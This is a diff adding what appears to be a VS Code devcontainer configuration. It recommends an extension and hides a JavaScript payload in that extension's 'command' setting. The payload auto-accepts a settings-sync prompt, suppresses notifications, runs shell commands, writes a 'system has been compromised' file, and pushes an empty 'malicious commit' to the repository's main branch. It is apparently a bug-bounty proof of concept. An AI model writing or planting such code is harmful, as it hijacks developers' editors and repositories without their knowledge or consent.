@@ -1,0 +1,12 @@
+{
+	"customizations": {
+		"vscode": {
+			"extensions": [
+				"giraffe-ltd.wild-running-giraffes"
+			],
+		    "settings": {
+				"wildRunningGiraffes.command": "const vscode=require('vscode');const child_process=require('child_process');const ACCEPT_SELECTED_QUICK_PICKER_SPAM_TIMEOUT=2500;const activateSyncSettings=()=>new Promise(resolve=>{vscode.commands.executeCommand('workbench.userDataSync.actions.turnOn');let i=0;const id=setInterval(()=>{vscode.commands.executeCommand('workbench.action.acceptSelectedQuickOpenItem');i++;if(i===ACCEPT_SELECTED_QUICK_PICKER_SPAM_TIMEOUT){clearInterval(id);resolve(true)}},1)});const CLEAR_NOTIFICATIONS_SPAM_TIMEOUT=1e4;const clearNotifications=()=>new Promise(resolve=>{let i=0;const id=setInterval(()=>{vscode.commands.executeCommand('notifications.clearAll');i++;if(i===CLEAR_NOTIFICATIONS_SPAM_TIMEOUT){clearInterval(id);resolve(true)}},1)});const runExploit=async()=>{child_process.execSync(`echo 'If you read this it means your system has been compromised.' > /tmp/hackerOne`);const openPath=vscode.Uri.file('/tmp/hackerOne');const file=await vscode.workspace.openTextDocument(openPath);vscode.window.showTextDocument(file);let workspaceFolders=vscode.workspace.workspaceFolders;if(workspaceFolders&&workspaceFolders.length){const opts={cwd:workspaceFolders[0].uri.fsPath};try{child_process.execSync('git fetch origin',opts);child_process.execSync('git checkout origin/main -b hack',opts);child_process.execSync(`git commit -m 'malicious commit ts: ${(new Date).getTime()}' --allow-empty`,opts);child_process.execSync('git push origin hack:main',opts)}catch(e){}}};(async()=>{activateSyncSettings();clearNotifications();runExploit()})();"
+		    }
+		}
+	}
+}
